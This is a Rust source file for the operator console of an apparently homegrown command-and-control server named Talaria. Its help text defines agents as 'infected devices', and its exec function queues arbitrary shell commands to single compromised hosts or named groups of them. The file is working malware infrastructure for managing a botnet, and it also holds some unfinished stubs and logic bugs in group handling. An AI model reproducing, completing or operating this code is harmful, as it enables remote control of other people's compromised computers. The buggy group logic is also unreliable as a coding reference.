use crate::SharedState;
use talaria::{console::*, protocol::*};

pub async fn evaluate_command(
    state: &SharedState,
    command_context: CommandContext,
) -> ConsoleResponse {
    match command_context.command {
        Command::Connect { agent } => connect(state, agent, command_context.current_target).await,
        Command::Disconnect => disconnect(command_context.current_target).await,
        Command::CreateGroup { group_name, agents } => {
            create_group(state, group_name, agents).await
        }
        Command::DeleteGroup { group_name } => delete_group(state, group_name).await,
        Command::AddAgentsToGroup { group_name, agents } => {
            add_agents_to_group(state, group_name, agents).await
        }
        Command::RemoveAgentsFromGroup { group_name, agents } => {
            remove_agents_from_group(state, group_name, agents).await
        }
        Command::Exec { agents, command } => {
            exec(state, agents, command, command_context.current_target).await
        }
        Command::ListAgents => list_agents(state).await,
        Command::Ping { agents } => todo!(),
        Command::Status { agents } => status(state, agents, command_context.current_target).await,
        Command::Nickname { agent, new_name } => {
            nickname(state, command_context.current_target, agent, new_name).await
        }
        Command::Clear => clear().await,
        Command::ListGroups => list_groups(state).await,
        Command::Help => help().await,
    }
}

async fn connect(
    state: &SharedState,
    target: TargetIdentifier,
    current_target: Option<TargetIdentifier>,
) -> ConsoleResponse {
    let state = state.read().await;

    let success: bool;
    let output: String;
    let mut new_target = NewTarget::NoChange;

    if current_target.is_some() {
        return ConsoleResponse {
            success: false,
            output: format!("already connected"),
            new_target: NewTarget::NoChange,
        };
    }

    match target {
        TargetIdentifier::Group { ref group } => {
            if state.groups.contains_key(group) {
                success = true;
                output = format!("successfully connected to group: {}", group);
            } else {
                success = false;
                output = format!("group {} not found", group);
            }
        }
        TargetIdentifier::Agent { ref agent } => match state.get_agent(agent.clone()) {
            Some(agent) => {
                success = true;
                output = format!(
                    "successfully connected to: {} [{}]",
                    agent.id,
                    agent.clone().nickname.unwrap_or("!!!".to_string())
                )
            }
            None => {
                success = false;
                output = format!("agent not found");
            }
        },
    }

    if success {
        new_target = NewTarget::Target { target };
    }

    ConsoleResponse {
        success,
        output,
        new_target,
    }
}

async fn disconnect(current_target: Option<TargetIdentifier>) -> ConsoleResponse {
    match &current_target {
        Some(_) => ConsoleResponse {
            success: true,
            output: format!("successfully disconnected"),
            new_target: NewTarget::NoTarget,
        },
        None => ConsoleResponse {
            success: false,
            output: format!("not currently connected"),
            new_target: NewTarget::NoChange,
        },
    }
}

async fn create_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;
    let mut agent_ids: Vec<u64> = vec![];

    if state.groups.contains_key(&group_name) {
        return ConsoleResponse {
            success: false,
            output: format!("group already exists"),
            new_target: NewTarget::NoChange,
        };
    }

    for ident in &agents {
        match state.get_agent(ident.clone()) {
            Some(agent) => agent_ids.push(agent.id),
            None => {
                return ConsoleResponse {
                    success: true,
                    output: format!("agent {:#?} not found", ident),
                    new_target: NewTarget::NoChange,
                }
            }
        }
    }

    agent_ids.dedup();

    state.groups.insert(group_name, agent_ids);

    return ConsoleResponse {
        success: true,
        output: format!("successfully created group"),
        new_target: NewTarget::NoChange,
    };
}

async fn delete_group(state: &SharedState, group_name: String) -> ConsoleResponse {
    let mut state = state.write().await;

    match state.groups.remove(&group_name) {
        Some(_) => ConsoleResponse {
            success: true,
            output: format!("successfully deleted group: {}", group_name),
            new_target: NewTarget::NoChange,
        },
        None => ConsoleResponse {
            success: false,
            output: format!("couldn't delete group {}", group_name),
            new_target: NewTarget::NoChange,
        },
    }
}

async fn add_agents_to_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;
    let mut agent_ids: Vec<u64> = vec![];

    if !state.groups.contains_key(&group_name) {
        return ConsoleResponse {
            success: false,
            output: format!("group not found"),
            new_target: NewTarget::NoChange,
        };
    }

    for ident in agents {
        match state.get_agent(ident.clone()) {
            Some(agent) => agent_ids.push(agent.id),
            None => {
                return ConsoleResponse {
                    success: false,
                    output: format!("agent {:#?} not found", ident),
                    new_target: NewTarget::NoChange,
                }
            }
        }
    }

    agent_ids.dedup();

    let groups_handle = match state.groups.get_mut(&group_name) {
        Some(groups_handle) => groups_handle,
        None => {
            return ConsoleResponse {
                success: false,
                output: format!("could not get handle to groups"),
                new_target: NewTarget::NoChange,
            }
        }
    };

    groups_handle.append(&mut agent_ids);
    groups_handle.dedup();

    ConsoleResponse {
        success: true,
        output: format!("successfully added agents to group"),
        new_target: NewTarget::NoChange,
    }
}

async fn remove_agents_from_group(
    state: &SharedState,
    group_name: String,
    agents: Vec<AgentIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;
    let mut agent_ids: Vec<u64> = vec![];

    if !state.groups.contains_key(&group_name) {
        return ConsoleResponse {
            success: false,
            output: format!("group not found"),
            new_target: NewTarget::NoChange,
        };
    }

    for ident in agents {
        match state.get_agent(ident.clone()) {
            Some(agent) => agent_ids.push(agent.id),
            None => {
                return ConsoleResponse {
                    success: false,
                    output: format!("agent {:#?} not found", ident),
                    new_target: NewTarget::NoChange,
                }
            }
        }
    }

    agent_ids.dedup();

    let groups_handle = match state.groups.get_mut(&group_name) {
        Some(groups_handle) => groups_handle,
        None => {
            return ConsoleResponse {
                success: false,
                output: format!("could not get handle to groups"),
                new_target: NewTarget::NoChange,
            }
        }
    };

    for (index, group_member) in groups_handle.clone().into_iter().enumerate() {
        for agent_id in &agent_ids {
            if group_member.clone() == *agent_id {
                groups_handle.remove(index);
            }
        }
    }

    ConsoleResponse {
        success: true,
        output: format!("succesfully removed agents from group"),
        new_target: NewTarget::NoChange,
    }
}

async fn clear() -> ConsoleResponse {
    ConsoleResponse {
        success: true,
        output: "\x1B[2J\x1B[1;1H".to_string(),
        new_target: NewTarget::NoChange,
    }
}

async fn list_agents(state: &SharedState) -> ConsoleResponse {
    let state = state.read().await;
    let mut output = String::new();

    for (id, agent) in &state.agents {
        output.push_str(
            format!(
                "{} - [{}]\n",
                id,
                agent.clone().nickname.unwrap_or(String::from("!!!"))
            )
            .clone()
            .as_str(),
        );
    }

    ConsoleResponse {
        success: true,
        output,
        new_target: NewTarget::NoChange,
    }
}

async fn list_groups(state: &SharedState) -> ConsoleResponse {
    let state = state.read().await;
    let agents = state.agents.clone();
    let mut output = String::new();

    for (group_name, ids) in &state.groups {
        output.push_str(&format!("#{}:\n", group_name));

        for id in ids {
            let agent = match agents.get(id) {
                Some(agent) => agent,
                None => {
                    return ConsoleResponse {
                        success: false,
                        output: format!("unable to get agent with id: {}", id),
                        new_target: NewTarget::NoChange,
                    }
                }
            };

            output.push_str(
                format!(
                    "   {} - [{}]\n",
                    id,
                    agent.nickname.clone().unwrap_or(String::from("!!!"))
                )
                .clone()
                .as_str(),
            );
        }
    }

    ConsoleResponse {
        success: true,
        output,
        new_target: NewTarget::NoChange,
    }
}

async fn nickname(
    state: &SharedState,
    current_target: Option<TargetIdentifier>,
    agent: Option<AgentIdentifier>,
    nickname: String,
) -> ConsoleResponse {
    let mut state = state.write().await;

    if agent.is_some() {
        let agent = agent.unwrap();

        match state.get_agent_mut(agent.clone()) {
            Some(agent) => {
                agent.nickname = Some(nickname);

                return ConsoleResponse {
                    success: true,
                    output: format!("set agent nickname"),
                    new_target: NewTarget::NoChange,
                };
            }
            None => {
                return ConsoleResponse {
                    success: false,
                    output: format!("agent {:#?} not found", agent),
                    new_target: NewTarget::NoChange,
                }
            }
        }
    } else if current_target.is_some() {
        let current_target = match current_target.unwrap() {
            TargetIdentifier::Group { group: _ } => {
                return ConsoleResponse {
                    success: false,
                    output: format!("must be connected to agent"),
                    new_target: NewTarget::NoChange,
                }
            }
            TargetIdentifier::Agent { agent } => agent,
        };

        match state.get_agent_mut(current_target.clone()) {
            Some(agent) => {
                agent.nickname = Some(nickname);

                return ConsoleResponse {
                    success: true,
                    output: format!("set agent nickname"),
                    new_target: NewTarget::NoChange,
                };
            }
            None => {
                return ConsoleResponse {
                    success: false,
                    output: format!("agent {:#?} not found", current_target),
                    new_target: NewTarget::NoChange,
                }
            }
        }
    }

    ConsoleResponse {
        success: false,
        output: format!("must be connected to agent, or agent must be specified"),
        new_target: NewTarget::NoChange,
    }
}

// FIXME: the `is_none() -> unwrap()` paradigm is really scary here
async fn exec(
    state: &SharedState,
    agents: Option<TargetIdentifier>,
    command: String,
    current_target: Option<TargetIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;

    let agents = if agents.is_none() {
        current_target
    } else {
        agents
    };

    if let Some(target) = agents {
        match target {
            TargetIdentifier::Group { group } => {
                let agents_in_group = state.groups.get(&group);

                if agents_in_group.is_none() {
                    return ConsoleResponse {
                        success: false,
                        output: format!("group not found"),
                        new_target: NewTarget::NoChange,
                    };
                }

                let agents_in_group = agents_in_group.unwrap();

                for agent in agents_in_group.clone() {
                    let agent_handle = state.agents.get_mut(&agent);

                    if agent_handle.is_none() {
                        continue;
                        // prevent failure if agent in group doesn't exist,
                        // continue running on other agents present in group
                    }

                    let agent_handle = agent_handle.unwrap();

                    let command_split = command.split(' ').collect::<Vec<&str>>();
                    // FIXME:command arg parsing should not be
                    // based around splitting on spaces, we should respect quotation marks

                    let instruction = AgentInstructionBody::Command {
                        command_id: 1, // FIXME: command_id should be unique, and generated
                        command: command_split[0].to_string(),
                        args: command_split[1..]
                            .into_iter()
                            .map(|x| x.to_string())
                            .collect(),
                    };

                    agent_handle.queue_instruction(&instruction);

                    return ConsoleResponse {
                        success: true,
                        output: format!("queued command"),
                        new_target: NewTarget::NoChange,
                    };
                }
            }
            TargetIdentifier::Agent { agent } => {
                let agent_handle = state.get_agent_mut(agent);

                if agent_handle.is_none() {
                    return ConsoleResponse {
                        success: false,
                        output: format!("agent not found"),
                        new_target: NewTarget::NoChange,
                    };
                }

                let agent_handle = agent_handle.unwrap();

                let command_split = command.split(' ').collect::<Vec<&str>>();
                // FIXME:command arg parsing should not be
                // based around splitting on spaces, we should respect quotation marks

                let instruction = AgentInstructionBody::Command {
                    command_id: 1, // FIXME: command_id should be unique, and generated
                    command: command_split[0].to_string(),
                    args: command_split[1..]
                        .into_iter()
                        .map(|x| x.to_string())
                        .collect(),
                };

                agent_handle.queue_instruction(&instruction);

                return ConsoleResponse {
                    success: true,
                    output: format!("queued command"),
                    new_target: NewTarget::NoChange,
                };
            }
        }
    }

    ConsoleResponse {
        success: false,
        output: format!("must be connected to agent, or agent must be specified"),
        new_target: NewTarget::NoChange,
    }
}

async fn status(
    state: &SharedState,
    agents: Option<TargetIdentifier>,
    current_target: Option<TargetIdentifier>,
) -> ConsoleResponse {
    let mut state = state.write().await;

    todo!()
}

async fn help() -> ConsoleResponse {
    let output: String = 
r#"---------------------------------------------------------------------------------------------------------------------
 _____          _
|_   _|_ _ _ __| |_ __ _ _ __ _   _ ___
  | |/ _` | '__| __/ _` | '__| | | / __|
  | | (_| | |  | || (_| | |  | |_| \__ \
  |_|\__,_|_|   \__\__,_|_|   \__,_|___/
---------------------------------------------------------------------------------------------------------------------
Vocab:
    agent    | An infected device
    group    | A named collection of infected devices
    target   | Either a single infected device, or a group of infected devices
    <>       | Required argument
    []       | Optional argument, if connected to a target and the argument is optional, command defaults to target
---------------------------------------------------------------------------------------------------------------------
Commands:
    connect <target>                                            | Connects to an agent or group 
    disconnect                                                  | Disconnects from an agent or gropu
    create_group <group_name> <agent1> <agent2>                 | Creates a group
    delete_group <group_name>                                   | Deletes a group
    add_agents_to_group <group_name> <agent1> <agent2>          | Adds agents to a group
    remove_agents_from_group <group_name> <agent1> <agent2>     | Removes agents from a group
    exec [target] <command>                                     | Executes a shell command on an agent or group
    list                                                        | Lists agents
    list_groups                                                 | Lists groups
    ping [target]                                               | Pings an agent or group
    status [target]                                             | Prints the status of an agent or group
    nickname [agent] <nickname>                                 | Sets the nickname of an agent
    clear                                                       | Clears the terminal
    help                                                        | Displays this message
---------------------------------------------------------------------------------------------------------------------"#
    .into();

    ConsoleResponse {
        success: true,
        output,
        new_target: NewTarget::NoChange,
    }
}
